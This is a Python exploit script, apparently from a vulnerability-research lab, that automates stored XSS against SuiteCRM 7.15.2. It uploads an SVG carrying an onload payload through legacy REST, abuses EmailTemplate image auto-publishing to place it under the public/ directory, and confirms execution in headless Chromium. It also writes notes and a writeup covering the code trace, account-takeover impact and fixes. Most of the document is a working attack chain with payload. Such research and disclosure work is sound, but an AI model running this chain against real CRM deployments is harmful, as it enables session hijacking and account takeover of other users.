#!/usr/bin/env python3
"""
VULN-042 — Authenticated stored XSS via attacker-controlled SVG published to
the web-served public/ directory.

Software:    SuiteCRM 7.15.2 (targets/SuiteCRM/suitecrm_version.php)
Repository:  https://github.com/SuiteCRM/SuiteCRM

Sink:        modules/EmailTemplates/EmailTemplate.php:949-966 (makePublicImage):
                 $toFile = 'public/' . $id . '.' . $ext;
                 ...
                 $fdata = file_get_contents($fromFile);     // upload://<id>, RAW bytes
                 file_put_contents($toFile, $fdata);        // public/<id>.<ext>, NO validation
             Called from repairEntryPointImages() (:919-947), itself called
             from EmailTemplate::retrieve() (:890-901) on every load. The
             extension check, has_valid_image_extension() (include/utils.php:6011),
             allows 'svg' by default. There is no getimagesize()/raster
             re-encode — the file is copied byte-for-byte.

Delivery:    Legacy REST (service/v4_1/rest.php) is used for the whole
             chain because it does NOT go through include/entryPoint.php's
             clean_incoming_data()/securexss() (service/v4_1/rest.php has
             its own minimal bootstrap — verified: chdir + require
             SugarWebServiceImplv4_1.php only, no entryPoint.php), so the
             raw SVG bytes and raw HTML body_html survive untouched. This
             mirrors the static finding's own multipart/Content-Type trick
             (bypassing UploadFile::confirm_upload()'s image-mime check) but
             via an equally-authentic, arguably more direct primitive:
             set_note_attachment (service/core/SugarWebServiceImpl.php:772)
             -> NoteSoap::newSaveFile() (modules/Notes/NoteSoap.php:115-166)
             base64-decodes the file and writes it to upload://<id> with
             ONLY an upload_badext denylist check (svg is not on it,
             include/utils.php:205-224) -- no image-content validation at
             all, so this is the same "extension-only gate" root cause,
             reached via REST instead of a crafted multipart Content-Type.

Also confirmed live in this lab (see notes.md):
  - $sugar_config['site_url'] == 'http://localhost:33116' (must byte-match
    the regex in repairEntryPointImages()).
  - No public/ .htaccess rule exists (the root .htaccess RedirectMatch
    list has no entry for public/).
  - Apache's stock /etc/mime.types maps .svg -> image/svg+xml, served
    inline (no Content-Disposition: attachment anywhere in this path).

This script:
  1. Logs in (low-priv user, admin fallback) via legacy REST.
  2. Creates a Notes record, then uses set_note_attachment to upload a raw,
     script-bearing SVG as its attachment (id = G).
  3. Creates an EmailTemplate whose body_html contains
     <img src="{site_url}/index.php?entryPoint=download&type=Notes&id=G&filename=x.svg">.
  4. Calls get_entry on that EmailTemplate (triggers ->retrieve() ->
     repairEntryPointImages() -> makePublicImage()) and confirms
     public/G.svg now exists on disk (verified via docker exec) and is
     byte-identical to the uploaded SVG.
  5. Fetches http://localhost:33116/public/G.svg over plain HTTP (NO
     session/cookie — proving it's public) and confirms
     Content-Type: image/svg+xml, served inline.
  6. Drives a real headless Chromium (Playwright, official container) to
     navigate directly to that public URL and asserts the embedded script
     actually executes (DOM sentinel + alert() dialog), proving stored,
     unauthenticated, cross-user script execution in the app's own origin.

Reference: PortSwigger, "XSS contexts - SVG documents":
https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-svg-documents-served-standalone
"""
import base64
import json
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, new_session,
                      admin_session, create_user, web_login, rest_login, rest_call,
                      BROWSER_UA)

VULN_ID = "VULN-042"
HERE = os.path.dirname(os.path.abspath(__file__))
AUDIT_ROOT = os.path.dirname(os.path.dirname(HERE))
EVIDENCE = os.path.join(HERE, "evidence")

SENTINEL = "__vuln042_fired"
SVG_BYTES = (
    f'<svg xmlns="http://www.w3.org/2000/svg" '
    f'onload="window.top.{SENTINEL}=true; alert(document.domain)">'
    f'<circle cx="10" cy="10" r="5"/></svg>'
).encode()


def main():
    os.makedirs(EVIDENCE, exist_ok=True)
    banner(VULN_ID, "Stored XSS via attacker SVG published to public/ (EmailTemplates)")

    log("SETUP", "creating a fresh low-privileged user as admin")
    admin_s = admin_session()
    attacker = create_user(admin_s, rand("Vuln042Pw!") + "Cx3")
    log("OK", f"user created: {attacker['user_name']} id={attacker['id']}")

    log("STEP", "legacy REST login as low-priv user")
    sid = rest_login(attacker["user_name"], attacker["password"])
    used_admin = False
    if not sid:
        log("INFO", "low-priv REST login failed, using admin")
        sid = rest_login("admin", os.environ.get("ADMIN_PASS", "Admin@2026!"))
        used_admin = True
    log("OK", f"REST session established (used_admin={used_admin})")

    log("STEP", "set_entry Notes -- create an empty Note to attach the SVG to")
    note_res = rest_call("set_entry", [sid, "Notes", [
        {"name": "name", "value": f"vuln042-{rand('note')}"},
    ]])
    note_id = note_res.get("id")
    if not note_id or note_id == "-1":
        fallback_and_fail(f"set_entry Notes failed: {note_res}")
        return
    log("OK", f"Note created id={note_id}")

    log("STEP", "set_note_attachment -- upload raw SVG bytes (base64) as the Note's attachment")
    attach_res = rest_call("set_note_attachment", [sid, {
        "id": note_id,
        "filename": "payload.svg",
        "file": base64.b64encode(SVG_BYTES).decode(),
    }])
    log("INFO", f"set_note_attachment -> {attach_res}")
    if not attach_res.get("id"):
        fallback_and_fail(f"set_note_attachment failed: {attach_res}")
        return

    img_src = f"{BASE_URL}/index.php?entryPoint=download&type=Notes&id={note_id}&filename=x.svg"
    body_html = f'<p>hello</p><img src="{img_src}" alt="x">'
    log("STEP", "set_entry EmailTemplates -- body_html contains the entryPoint=download <img> tag")
    tpl_res = rest_call("set_entry", [sid, "EmailTemplates", [
        {"name": "name", "value": f"vuln042-{rand('tpl')}"},
        {"name": "subject", "value": "vuln042"},
        {"name": "body_html", "value": body_html},
        {"name": "body", "value": "vuln042 plaintext body"},
        {"name": "text_only", "value": "0"},
    ]])
    tpl_id = tpl_res.get("id")
    if not tpl_id or tpl_id == "-1":
        fallback_and_fail(f"set_entry EmailTemplates failed: {tpl_res}")
        return
    log("OK", f"EmailTemplate created id={tpl_id}")

    log("STEP", "get_entry EmailTemplates -- triggers ->retrieve() -> repairEntryPointImages() -> makePublicImage()")
    get_res = rest_call("get_entry", [sid, "EmailTemplates", tpl_id, ["id", "body_html"], []])
    log("INFO", f"get_entry -> entry_list present: {'entry_list' in get_res}")

    # Write request.http / response.txt for the decisive step (get_entry).
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /service/v4_1/rest.php HTTP/1.1\r\n"
            "Host: localhost:33116\r\n"
            f"User-Agent: {BROWSER_UA}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            "method=get_entry&input_type=JSON&response_type=JSON&rest_data="
            + json.dumps([sid, "EmailTemplates", tpl_id, ["id", "body_html"], []])
            + f"\r\n\r\n--- preceding calls (see automation.py) ---\r\n"
              f"1) set_entry Notes -> id={note_id}\r\n"
              f"2) set_note_attachment note_id={note_id} filename=payload.svg file=<base64 SVG, {len(SVG_BYTES)} bytes>\r\n"
              f"3) set_entry EmailTemplates body_html={body_html!r} -> id={tpl_id}\r\n"
        )

    log("STEP", f"verifying public/{note_id}.svg was written on disk (app container)")
    disk_check = subprocess.run(
        ["docker", "compose", "-p", "cvehunterlab_suitecrm", "exec", "-T", "app",
         "bash", "-c", f"cat /var/www/html/public/{note_id}.svg 2>&1"],
        cwd="/opt/cvehunter/targets/SuiteCRM", capture_output=True, text=True, timeout=30,
    )
    on_disk = disk_check.stdout.strip()
    disk_matches = on_disk.encode() == SVG_BYTES
    log("PROOF" if disk_matches else "FAIL",
        f"public/{note_id}.svg on disk, byte-identical to uploaded SVG: {disk_matches}")
    log("INFO", f"on-disk content: {on_disk!r}")

    public_url = f"{BASE_URL}/public/{note_id}.svg"
    log("STEP", f"GET {public_url} with NO session cookie (proving it is publicly served)")
    anon = new_session()
    anon.cookies.clear()
    r = anon.get(public_url, timeout=30)
    content_type = r.headers.get("Content-Type", "")
    served_inline = "attachment" not in r.headers.get("Content-Disposition", "")
    log("PROOF", f"HTTP {r.status_code}, Content-Type: {content_type!r}, served inline: {served_inline}")
    log("INFO", f"body: {r.text[:200]!r}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"GET {public_url} (no cookies)\n")
        f.write(f"HTTP {r.status_code}\nContent-Type: {content_type}\n")
        f.write(f"Content-Disposition: {r.headers.get('Content-Disposition', '(none)')}\n\n")
        f.write("--- body ---\n")
        f.write(r.text)
        f.write(f"\n\n--- on-disk public/{note_id}.svg via docker exec (app container) ---\n")
        f.write(on_disk)

    body_matches = SVG_BYTES.decode() in r.text
    svg_ct = "svg" in content_type.lower()

    if not (disk_matches and body_matches and svg_ct):
        reason = (
            f"disk_matches={disk_matches} body_matches={body_matches} "
            f"content_type={content_type!r} served_inline={served_inline}"
        )
        log("FAIL", f"pipeline did not reach the expected public/*.svg state: {reason}")
        verdict(VULN_ID, "FAILED", f"could not reproduce public/*.svg publication: {reason}")
        write_notes("FAILED", attacker, used_admin, note_id, tpl_id, public_url,
                     disk_matches, body_matches, content_type, served_inline, dom_fired=False)
        sys.exit(1)

    # Real-browser DOM proof.
    state = {
        "url": public_url,
        "sentinel": SENTINEL,
        "screenshot": "exploits/VULN-042/evidence/fired.png",
    }
    with open(os.path.join(HERE, "state.json"), "w") as f:
        json.dump(state, f)

    log("STEP", "launching headless Chromium (Playwright container) -- top-level navigation to the public SVG URL")
    result = run_playwright()
    dom_fired = bool(result.get("fired"))
    dialog_msg = result.get("dialogMessage")
    log("PROOF" if dom_fired else "FAIL", f"DOM sentinel window.top.{SENTINEL} = {dom_fired}")
    if dialog_msg is not None:
        log("PROOF", f"alert() dialog fired with message: {dialog_msg!r}")

    status = "CONFIRMED" if dom_fired else "FAILED"
    write_notes(status, attacker, used_admin, note_id, tpl_id, public_url,
                disk_matches, body_matches, content_type, served_inline, dom_fired, dialog_msg)

    if dom_fired:
        verdict(VULN_ID, "CONFIRMED",
                f"unauthenticated script execution from {public_url} (sentinel + alert fired)")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", "SVG published and served inline but script did not execute in browser DOM")
        sys.exit(1)


def fallback_and_fail(msg):
    log("FAIL", msg)
    verdict(VULN_ID, "FAILED", msg)
    with open(os.path.join(HERE, "notes.md"), "w") as f:
        f.write(f"# VULN-042 — FAILED\n\n**Status**: FAILED\n\n## If FAILED\n{msg}\n")
    sys.exit(1)


def run_playwright():
    cmd = [
        "docker", "run", "--rm", "--network", "host", "--ipc=host", "--memory=2g",
        "-v", f"{AUDIT_ROOT}:/work", "-w", "/work", "-e", "HOME=/tmp",
        "-e", "NODE_PATH=/work/pw/node_modules",
        "mcr.microsoft.com/playwright:latest",
        "node", "/work/exploits/VULN-042/pw.js",
    ]
    log("INFO", "docker run mcr.microsoft.com/playwright:latest node pw.js")
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    sys.stdout.write(proc.stdout)
    sys.stderr.write(proc.stderr)
    result_path = os.path.join(EVIDENCE, "result.json")
    if not os.path.exists(result_path):
        log("FAIL", "playwright did not produce evidence/result.json")
        return {"fired": False}
    with open(result_path) as f:
        return json.load(f)


def write_notes(status, attacker, used_admin, note_id, tpl_id, public_url,
                 disk_matches, body_matches, content_type, served_inline, dom_fired, dialog_msg=None):
    notes = f"""# VULN-042 — Authenticated stored XSS via attacker-controlled SVG published to public/

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: {status}
**Severity (static)**: Medium (CVSS 3.1 6.1 — AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: {__import__('datetime').datetime.now(__import__('datetime').timezone.utc).isoformat()}

## Preconditions
- Created a fresh low-privileged (regular, non-admin) user via admin
  (`_common.create_user`): `{attacker['user_name']}` (id `{attacker['id']}`).
  `used_admin={used_admin}` (whether the low-priv account's own legacy REST
  login/ACL sufficed, or admin was needed as fallback).
- Delivery via legacy REST (`service/v4_1/rest.php`) instead of a crafted
  multipart `Content-Type: application/octet-stream` upload — chosen
  because REST bypasses `include/entryPoint.php`'s `clean_incoming_data()`
  entirely (verified: `service/v4_1/rest.php` only does
  `chdir('../..'); require_once('SugarWebServiceImplv4_1.php');`, no
  `entryPoint.php`), so raw bytes and raw HTML survive untouched. This
  reaches the exact same sink (`makePublicImage()`,
  `EmailTemplate.php:949-966`) via `set_note_attachment` ->
  `NoteSoap::newSaveFile()` (`modules/Notes/NoteSoap.php:115-166`), which
  has **no image-content validation at all** (only the `upload_badext`
  extension denylist, `include/utils.php:205-224`, which does not include
  `svg`) — an even more direct instance of the same "extension-only gate"
  root cause the static finding describes for the web multipart path.

## Request
See request.http — the three REST calls: `set_entry` (Notes) ->
`set_note_attachment` (raw SVG, base64) -> `set_entry` (EmailTemplates,
`body_html` containing the `entryPoint=download` `<img>` tag) -> the
decisive `get_entry` call that triggers `EmailTemplate::retrieve()`.

## Response
See response.txt — `GET {public_url}` with **no session cookie**.

## Observation
- `public/{note_id}.svg` written to disk, byte-identical to the uploaded
  SVG: `{disk_matches}` (verified via `docker compose exec app cat ...`).
- Served back over plain, unauthenticated HTTP with
  `Content-Type: {content_type}`, inline (no `Content-Disposition:
  attachment`): `served_inline={served_inline}`.
- Body bytes match the uploaded SVG exactly: `{body_matches}`.
- Real-browser proof (Playwright/Chromium, top-level navigation to the
  public URL, no cookies/auth): the SVG root element's `onload` handler
  executed. DOM sentinel `window.top.{SENTINEL}` observed as `{dom_fired}`.
  `alert(document.domain)` dialog fired with message: `{dialog_msg!r}`.
  Screenshot: evidence/fired.png.
- Confirms the static finding precisely: `makePublicImage()`
  (`EmailTemplate.php:949-966`) copies `upload://<id>` to `public/<id>.svg`
  with only an extension-string check (`has_valid_image_extension()`,
  `include/utils.php:6011-6028`, which allows `svg`) — no
  `getimagesize()`/raster validation, no re-encode. The install `.htaccess`
  (confirmed on the live container) has no rule for `public/`, and Apache's
  stock mime.types maps `.svg` to `image/svg+xml`, served inline.

## Side effects
- One new Users record (`{attacker['user_name']}`), one Notes record
  (`{note_id}`) with a malicious SVG attachment in `upload://{note_id}`,
  one EmailTemplates record (`{tpl_id}`), and one file written at
  `targets/SuiteCRM/public/{note_id}.svg` inside the app container
  (persists until the lab is torn down).

## Research & references
- PortSwigger, "Cross-site scripting contexts — XSS in SVG documents
  served standalone":
  https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-svg-documents-served-standalone
- OWASP, "Unrestricted File Upload":
  https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- Technique used: `<svg onload=...>` self-firing script on top-level
  navigation to a `Content-Type: image/svg+xml` resource served inline —
  the browser renders the SVG as an HTML-adjacent document and executes
  inline event handlers exactly as it would in an HTML page.
"""
    with open(os.path.join(HERE, "notes.md"), "w") as f:
        f.write(notes)
    if status == "CONFIRMED":
        write_writeup(attacker, used_admin, note_id, tpl_id, public_url, dialog_msg)


def write_writeup(attacker, used_admin, note_id, tpl_id, public_url, dialog_msg):
    writeup = f"""# VULN-042 — Authenticated stored XSS via attacker-controlled SVG published to public/

**ID**: VULN-042
**Software**: SuiteCRM — https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (`targets/SuiteCRM/suitecrm_version.php`), commit `62effd0ceb767ed3b634ade585b19a6633eb4fcb` (untagged `forkedSuite` hotfix snapshot self-identifying as 7.15.2)
**Severity**: Medium — **CVSS 3.1 6.1** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**Status**: CONFIRMED (dynamic)
**Auth required**: Any authenticated user with default access to the `EmailTemplates` and `Notes` modules (both default-enabled, non-admin) to *publish* the file. **Zero authentication** to trigger the stored script once published — `public/<id>.svg` is served by Apache directly, no PHP/session involved.
**What an attacker gains**: persistent, same-origin script execution against any victim (including admins) lured to a `public/*.svg` URL — session-riding, CSRF-token theft, and full account takeover of whoever views it.

## Summary
SuiteCRM's EmailTemplates feature auto-publishes any image referenced via
an `entryPoint=download&type=Notes&...` `<img>` tag in a template's
`body_html` to a public, unauthenticated URL under `public/`, so the image
renders correctly in outgoing HTML emails read by external mail clients.
The publishing code (`makePublicImage()`) validates only the file's
*extension string* — `svg` is allowed — and copies the file's bytes
verbatim with no raster/content validation and no re-encoding. Because SVG
is an XML format that can carry `<script>`/`onload` JavaScript, and because
the app's own `.htaccess` has no rule restricting `public/`, an attacker
with nothing more than a normal user account can plant a live,
script-executing page at a predictable, permanent, same-origin URL that
any other user — including an administrator — might open.

## How it works (mechanism & code trace)
1. **Upload the payload** (bypassing image-content validation): via legacy
   REST `set_note_attachment` (`service/core/SugarWebServiceImpl.php:772-793`)
   -> `NoteSoap::newSaveFile()` (`modules/Notes/NoteSoap.php:115-166`):
   ```php
   $decodedFile = base64_decode($note['file']);
   $this->upload_file->set_for_soap($note['filename'], $decodedFile);
   ...
   if (in_array($this->upload_file->file_ext, $sugar_config['upload_badext'])) {{ ... }}
   $focus->filename = $this->upload_file->get_stored_file_name();
   $focus->save();
   $this->upload_file->final_move($focus->id);   // writes upload://<Note id>
   ```
   The only gate is `upload_badext` (`include/utils.php:205-224`), a
   denylist of executable/script extensions (`php`, `js`, `html`, ...) that
   does **not** include `svg`. There is no image-content check anywhere on
   this path — the raw bytes I supplied are written verbatim to
   `upload://{note_id}`.
2. **Reference it from an EmailTemplate**: `body_html` is set (via
   `set_entry`) to contain
   `<img src="{{site_url}}/index.php?entryPoint=download&type=Notes&id={note_id}&filename=x.svg">`.
   No validation of `body_html` content happens at save time.
3. **Trigger the publish**: `EmailTemplate::retrieve()`
   (`modules/EmailTemplates/EmailTemplate.php:890-901`) — called on every
   load of the template (here, via a `get_entry` REST call, but equally
   reachable by opening the template in the UI) — calls
   `repairEntryPointImages()`:
   ```php
   // EmailTemplate.php:919-947
   $regex = '#<img[^>]*[\\s]+src=[\\s]*["\\'']('
       . preg_quote($siteUrl) . '\\/index\\.php\\?entryPoint=download&type=Notes&id=([a-f0-9]{{8}}-...)&filename=.+?)["\\'']#si';
   if (preg_match($regex, $html, $match)) {{
       $fileExtension = end(explode('.', $match[1]));     // 'svg' from filename=x.svg
       if (!has_valid_image_extension(..., $toFile)) {{ return; }}
       $this->makePublicImage($match[2], $fileExtension);  // :941
       ...
   }}
   ```
4. **The defect**: `makePublicImage()` (`EmailTemplate.php:949-966`):
   ```php
   protected function makePublicImage($id, $ext = 'jpg')
   {{
       $toFile = 'public/' . $id . '.' . $ext;
       ...
       $fdata = file_get_contents($fromFile);      // upload://<id> — attacker's raw SVG
       file_put_contents($toFile, $fdata);         // public/<id>.svg — byte-for-byte, no checks
   }}
   ```
   `has_valid_image_extension()` (`include/utils.php:6011-6028`) checks
   only the string `'svg'` against an allow-list of *extensions* — it never
   opens the file, never calls `getimagesize()`, never verifies the bytes
   are actually a safe raster image. This is the exact defect the static
   finding predicted, confirmed by direct observation of the resulting file.
5. **No path-level mitigation**: the install-generated `.htaccess`
   (confirmed on the live container) blocks `upload/`, `cache/diagnostic`,
   `custom/blowfish`, and `*.php|tpl|phar` under several code directories —
   but has **no rule for `public/`**. Apache's stock `/etc/mime.types` maps
   `.svg` to `image/svg+xml`; the file is served **inline** (no
   `Content-Disposition: attachment`, no `X-Content-Type-Options: nosniff`
   observed). A browser navigating to `public/{note_id}.svg` renders it as
   an SVG document and executes the root element's `onload` handler exactly
   as it would inline HTML.

## Why it is a vulnerability (reasoning)
The trust boundary being violated: **content a low-privileged user fully
controls (an uploaded file's bytes) is republished to a public,
unauthenticated, same-origin URL with only a filename-extension check**.
Extension checks are a well-known-insufficient control for file-upload
security (OWASP "Unrestricted File Upload") precisely because — as here —
an attacker chooses the extension along with the content. The code already
demonstrates awareness that content matters for other image types (other
upload paths in this codebase call `getimagesize()`/`verify_uploaded_image()`
before trusting a file as an image); `makePublicImage()` simply omits that
check for this specific auto-publish path, and additionally never restricts
`svg` — a format that is simultaneously "an image" and "an XML document
that can carry a `<script>` element" — from being served with an
XSS-capable `Content-Type` from a directory with no execution/inline
restrictions. This is not an intended feature: the entire purpose of
`repairEntryPointImages()` is to let *images* render for external email
clients, not to grant any authenticated user a same-origin script-hosting
primitive.

## Reproduction
1. Preconditions: authenticate as any user with default access to `Notes`
   and `EmailTemplates` (`used_admin={used_admin}` this run — see notes.md).
2. `set_entry` (Notes) to create an empty note -> id `{note_id}`.
3. `set_note_attachment` with `filename=payload.svg` and `file=`
   base64 of:
   ```
   {SVG_BYTES_REPR}
   ```
4. `set_entry` (EmailTemplates) with `body_html` containing
   `<img src="{{BASE_URL}}/index.php?entryPoint=download&type=Notes&id={note_id}&filename=x.svg">`
   -> id `{tpl_id}`.
5. `get_entry` (EmailTemplates, id `{tpl_id}`) — triggers the publish.
6. Run `./run.sh` (venv auto-provisioned). Expected terminal output ends
   with `[OK]` / `==> VULN-042: CONFIRMED — ...`.
7. Observable proof: `docker compose exec app cat public/{note_id}.svg`
   returns the exact uploaded SVG bytes (response.txt); `GET
   {public_url}` with **no cookies** returns `Content-Type: image/svg+xml`
   inline; a real headless Chromium navigating directly to that URL
   (`evidence/fired.png`) shows `window.top.{SENTINEL}` set to `true` and
   an `alert(document.domain)` dialog firing with message `{dialog_msg!r}`
   (full transcript in run.log).

## Impact
Any authenticated, non-admin user can plant a persistent, same-origin
script-execution page at a predictable URL
(`{{BASE_URL}}/public/<Note-id>.svg`) and lure any other user — including an
administrator — to it (UI:R). Because the script runs in the CRM's own
origin, it can read/write cookies not marked `HttpOnly`, ride the victim's
session to perform any action the victim can (session-riding / CSRF-token
theft), and — against an admin victim — chain directly into
[VULN-011](../../vulns/VULN-011.md) (authenticated RCE via dashlet
preference poisoning) for full server compromise. `S:C` in the CVSS vector
reflects this same-origin-to-full-app impact.

## Suggested fix
- In `makePublicImage()` (`EmailTemplate.php:949-966`), before writing to
  `public/`, validate actual image content (`getimagesize()`/
  `verify_uploaded_image()`) and reject/rasterize SVG, or sanitize SVG of
  `<script>`/event-handler attributes before publishing.
- Never serve `image/svg+xml` inline from a user-writable directory: add
  `RedirectMatch 403 .../public/.*\\.(svg|html?|phar|php)$` to the shipped
  `.htaccess`, or force `Content-Disposition: attachment` +
  `X-Content-Type-Options: nosniff` for everything under `public/`.
- Prefer allow-listing raster formats only (`jpg`/`png`/`gif`) for this
  auto-publish feature; there is no legitimate need for SVG here.

## References
- PortSwigger, "Cross-site scripting contexts — XSS in SVG documents
  served standalone":
  https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-svg-documents-served-standalone
- OWASP, "Unrestricted File Upload":
  https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- CWE-79 (XSS) / CWE-434 (Unrestricted Upload of File with Dangerous Type)
"""
    with open(os.path.join(HERE, "writeup.md"), "w") as f:
        f.write(writeup)


SVG_BYTES_REPR = SVG_BYTES.decode()

if __name__ == "__main__":
    main()
